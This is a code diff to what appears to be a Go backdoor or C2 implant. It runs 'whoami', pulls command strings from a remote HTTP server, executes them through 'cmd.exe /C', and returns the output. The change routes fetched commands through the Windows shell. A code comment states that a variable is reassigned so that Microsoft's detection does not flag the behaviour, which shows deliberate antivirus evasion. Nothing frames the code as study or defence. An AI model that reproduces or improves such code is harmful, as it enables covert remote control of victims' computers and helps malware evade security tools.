@@ -24,7 +24,7 @@ func main() {
 	client := http.Client{}
 	sb1 := "whoami"
 
-	cmd := exec.Command(sb1)
+	cmd := exec.Command("cmd.exe", "/C", sb1)
 	// Consider adding here logic to execute these commands under a new process or a child process to avoid crashing the main program if the command errors
 
 	result, _ := cmd.Output()
@@ -60,8 +60,7 @@ func main() {
 
 		// We reassign the string body to a new variable because otherwise Microsoft picks up that we're passing an HTML request right to be executed
 		sb1 := strings.Replace(sb, "\n", "", -1) // we get the command back with a \n which fucks up execution, strip it with this
-
-		cmd := exec.Command(sb1)
+		cmd := exec.Command("cmd.exe", "/C", sb1)
 
 		result, _ := cmd.Output()
 		toSend := []byte(result)
